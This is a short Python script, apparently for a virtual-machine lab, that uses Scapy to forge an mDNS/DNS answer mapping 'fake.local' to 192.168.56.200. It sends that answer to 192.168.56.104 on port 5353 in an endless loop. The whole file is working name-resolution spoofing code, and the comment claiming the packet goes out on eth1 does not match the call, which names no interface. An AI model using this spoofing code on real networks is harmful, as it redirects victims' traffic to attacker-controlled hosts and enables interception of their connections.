from scapy.all import *

pkt = Ether()/IP(dst="192.168.56.104")/UDP(dport=5353)/DNS(
    id=1, qr=1, aa=1,
    qd=DNSQR(qname="fake.local"),
    an=DNSRR(rrname="fake.local", rdata="192.168.56.200")
)

# Force it out on eth1 (host-only)
sendp(pkt, loop=1, inter=1)
